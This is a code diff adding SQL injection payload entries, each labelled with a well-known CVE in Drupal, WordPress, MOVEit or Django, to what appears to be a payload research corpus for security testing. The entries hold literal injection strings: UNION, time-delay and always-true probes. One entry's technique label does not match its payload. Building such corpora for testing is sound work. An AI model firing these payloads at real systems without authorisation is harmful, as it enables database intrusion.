@@ -339,6 +339,58 @@ export class PayloadResearchCorpus {
       riskLevel: 'Informational',
       version: '2026.4',
     },
+
+    // ----------------------------------------------------
+    // 7. Famous Real-World CVE Archetypes
+    // ----------------------------------------------------
+    {
+      id: 'CVE_DRUPAL_2014_3704',
+      name: 'Drupalgeddon Array Key Expansion (CVE-2014-3704)',
+      dbms: 'MySQL',
+      context: 'single_quote_string',
+      technique: 'UNION-based',
+      payload: "name[0) UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -]=admin",
+      expectedBehavior: 'Unsanitized associative array key expands directly into SQL template',
+      negativeBehavior: 'Validation error or array key properly escaped',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
+    {
+      id: 'CVE_WORDPRESS_2022_21661',
+      name: 'WordPress WP_Query Taxonomy Injection (CVE-2022-21661)',
+      dbms: 'MySQL',
+      context: 'numeric',
+      technique: 'Time-based',
+      payload: "1 AND (SELECT 1 FROM (SELECT(SLEEP(3)))wp_test)",
+      expectedBehavior: 'Nested taxonomy array bypasses is_numeric check, injecting into tax_query clause',
+      negativeBehavior: 'Strict integer type casting rejects injection',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
+    {
+      id: 'CVE_MOVEIT_2023_34362',
+      name: 'MOVEit Transfer Header-Driven SQLi (CVE-2023-34362)',
+      dbms: 'MySQL',
+      context: 'single_quote_string',
+      technique: 'Boolean-based',
+      payload: "session_token' OR 1=1-- -",
+      expectedBehavior: 'Untrusted HTTP header value concatenated into backend database query',
+      negativeBehavior: 'Header value sanitized or parameterized via prepared statement',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
+    {
+      id: 'CVE_DJANGO_2020_7471',
+      name: 'Django ORM StringAgg Delimiter Injection (CVE-2020-7471)',
+      dbms: 'PostgreSQL',
+      context: 'single_quote_string',
+      technique: 'Error-based',
+      payload: "'; SELECT pg_sleep(3);--",
+      expectedBehavior: 'Unescaped delimiter parameter in StringAgg aggregation',
+      negativeBehavior: 'Delimiter properly escaped or parameterized',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
   ];
 
   public static getPayloads(options?: {
